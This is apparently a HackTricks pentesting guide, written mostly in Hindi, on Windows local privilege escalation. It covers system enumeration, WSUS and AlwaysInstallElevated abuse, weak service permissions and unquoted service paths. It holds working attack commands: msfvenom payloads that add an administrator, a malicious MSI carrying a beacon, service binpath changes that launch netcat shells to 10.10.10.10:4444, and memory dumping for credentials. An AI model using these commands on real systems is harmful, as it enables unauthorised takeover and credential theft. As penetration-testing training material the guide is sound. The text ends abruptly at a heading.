# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors को खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं तो जारी रखने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में ऐसी कई चीज़ें हैं जो आपको सिस्टम का enumeration करने, executables चलाने या आपकी गतिविधियों का पता लगाने से रोक सकती हैं। privilege escalation enumeration शुरू करने से पहले आपको निम्न पृष्ठ को पढ़ना चाहिए और इन सभी defenses mechanisms का enumeration करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

जांचें कि क्या Windows के इस संस्करण में कोई ज्ञात vulnerability है (लागू किए गए patches भी जांचें).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### संस्करण Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो एक Windows environment द्वारा प्रस्तुत किए गए **massive attack surface** को दर्शाती हैं।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/juicy जानकारी env variables में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

आप सीख सकते हैं कि इसे कैसे चालू करें: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादनों का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड इनवोकेशन्स, और स्क्रिप्ट के हिस्से शामिल होते हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम हमेशा कैप्चर नहीं किए जा सकते।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 events देखने के लिए आप निम्न कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की संपूर्ण गतिविधि और पूर्ण कंटेंट रिकॉर्ड कैप्चर की जाती है, जिससे यह सुनिश्चित होता है कि कोड का प्रत्येक ब्लॉक चलते समय दस्तावेजीकृत हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेजीकृत करके प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए लॉगिंग इवेंट्स Windows Event Viewer में इस पथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
अंतिम 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि updates http**S** के बजाय http के माध्यम से अनुरोध किए जा रहे हों तो आप सिस्टम को compromise कर सकते हैं।

आप यह जाँच करके शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं; इसके लिए cmd में निम्नलिखित चलाएँ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी जैसी प्रतिक्रिया मिलती है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और अगर `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

तो, **यह एक्सप्लॉयटेबल है।** अगर अंतिम रजिस्ट्री का मान `0` है, तो WSUS एंट्री को अनदेखा किया जाएगा।

इन कमजोरियों का फायदा उठाने के लिए आप ऐसे टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS ट्रैफिक में 'fake' अपडेट इंजेक्ट करने के लिए बने हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी रूप से, यह वही flaw है जिसका यह बग फायदा उठाता है:

> अगर हमारे पास स्थानीय यूज़र प्रॉक्सी बदलने की शक्ति है, और Windows Updates Internet Explorer की सेटिंग्स में कॉन्फ़िगर किए गए प्रॉक्सी का उपयोग करता है, तो हमारे पास लोकली [PyWSUS](https://github.com/GoSecure/pywsus) चलाकर अपनी ही ट्रैफिक को इंटरसेप्ट करने और अपने एसेट पर elevated यूज़र के रूप में कोड चलाने की क्षमता होगी।
>
> इसके अलावा, क्योंकि WSUS सर्विस current user की सेटिंग्स का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। अगर हम WSUS hostname के लिए self-signed सर्टिफिकेट जनरेट करें और इस सर्टिफिकेट को current user के certificate store में जोड़ दें, तो हम HTTP और HTTPS दोनों WSUS ट्रैफिक को इंटरसेप्ट कर सकेंगे। WSUS सर्टिफिकेट पर trust-on-first-use प्रकार की वैलिडेशन लागू करने के लिए किसी HSTS-जैसी मैकेनिज्म का उपयोग नहीं करता। अगर प्रस्तुत किया गया सर्टिफिकेट यूज़र द्वारा ट्रस्ट किया जाता है और इसका hostname सही है, तो सर्विस इसे स्वीकार कर लेगी।

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई एंटरप्राइज़ एजेंट localhost IPC surface और एक privileged update चैनल एक्सपोज़ करते हैं। अगर enrollment को attacker सर्वर की ओर मजबूर किया जा सके और updater किसी rogue root CA या कमजोर signer चेक्स पर भरोसा करे, तो एक स्थानीय यूज़र एक malicious MSI पहुँचा सकता है जिसे SYSTEM सर्विस इंस्टॉल कर देती है। एक सामान्यीकृत तकनीक (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** एनवायरनमेंट्स में एक **local privilege escalation** vulnerability मौजूद है जब कुछ विशिष्ट शर्तें पूरी होती हैं। इन शर्तों में शामिल हैं ऐसे एनवायरनमेंट जहाँ **LDAP signing लागू नहीं है,** उपयोगकर्ताओं के पास self-rights हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और डोमेन में कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **शर्तें** default settings में पूरी होती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

अटैक के फ्लो के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 registry entries **enabled** हैं (मान **0x1**), तो किसी भी privilege के उपयोगकर्ता `*.msi` फ़ाइलों को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. यह स्क्रिप्ट एक precompiled MSI इंस्टॉलर लिखती है जो user/group addition के लिए prompt करता है (so you will need GIU access):
```
Write-UserAddMSI
```
सिर्फ बनाए गए binary को execute करें ताकि privileges escalate हो जाएं।

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को **management of local Administrator passwords** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करता है कि domain से जुड़े कंप्यूटरों पर प्रत्येक password **unique, randomised, and regularly updated** हो। ये passwords Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दिए गए हों, जिससे वे अधिकृत होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA सुरक्षा

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा इसकी मेमोरी को **पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **रोककर**, सिस्टम और अधिक सुरक्षित बनाया जा सके।\
[**LSA सुरक्षा के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी रजिस्टर्ड security package द्वारा प्रमाणित किया जाता है, तो सामान्यत: उस उपयोगकर्ता के लिए domain credentials स्थापित कर दिए जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूह सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं, क्या उनमें किसी के पास रोचक permissions हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप किसी privileged group के सदस्य हैं तो आप escalate privileges कर सकते हैं। Privileged groups और उन्हें दुरुपयोग करके escalate privileges करने के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और जानें** कि एक **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **learn about interesting tokens** और उन्हें दुरुपयोग करने का तरीका जान सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग्ड उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, processes को सूचीबद्ध करते समय **check for passwords inside the command line of the process**।\
जाँच करें कि क्या आप किसी चल रहे binary को **overwrite some binary running** कर सकते हैं या क्या आपके पास binary फ़ोल्डर की write permissions हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का exploit कर सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers running, you could abuse it to escalate privileges**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) की जाँच करें।

**processes binaries के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप चल रहे process का memory dump **procdump** from sysinternals से बना सकते हैं। FTP जैसे services में **credentials in clear text in memory** होते हैं — memory को dump करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन उपयोगकर्ता को CMD लॉन्च करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, और "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

Service Triggers Windows को एक service शुरू करने देते हैं जब कुछ शर्तें पूरी हों (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। भले ही आपके पास SERVICE_START rights न हों, आप अक्सर उनके triggers को सक्रिय करके विशेषाधिकार प्राप्त सेवाएँ शुरू कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
यह सुझाव दिया जाता है कि प्रत्येक सेवा के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ का binary **accesschk** उपलब्ध हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसित है कि जांचें कि क्या "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_सेवा शुरू नहीं की जा सकती है, या तो इसलिए कि यह अक्षम है या क्योंकि इसके साथ कोई सक्षम डिवाइस जुड़ा नहीं है._

आप इसे सक्षम करने के लिए निम्न का उपयोग कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का दूसरा workaround है, जिसे चलाया जा सकता है:**
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पथ संशोधित करें**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी सेवा पर **SERVICE_ALL_ACCESS** हो, उस सेवा के executable binary को संशोधित करना संभव है। **sc** को संशोधित और execute करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges को विभिन्न permissions के माध्यम से escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: service binary की reconfiguration की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership प्राप्त करने और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता विरासत में मिलती है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी विरासत में मिलती है।

इस vulnerability के detection और exploitation के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (system32 में नहीं) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधित करने की अनुमतियाँ

आपको जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप निम्नलिखित करके किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** **जांच** सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जाँच करनी चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं। अगर हाँ, तो सर्विस द्वारा निष्पादित बाइनरी बदली जा सकती है।

बाइनरी के निष्पादित Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory अनुमतियाँ

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में यह **arbitrary code execute करने के लिए पर्याप्त:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में नहीं है, तो Windows space से पहले वाले हर ending को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows services से संबंधित नहीं होने वाले सभी unquoted service paths की सूची बनाएं:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस भेद्यता का पता लगा सकते हैं और इसका शोषण कर सकते हैं** यह भेद्यता metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअल रूप से metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

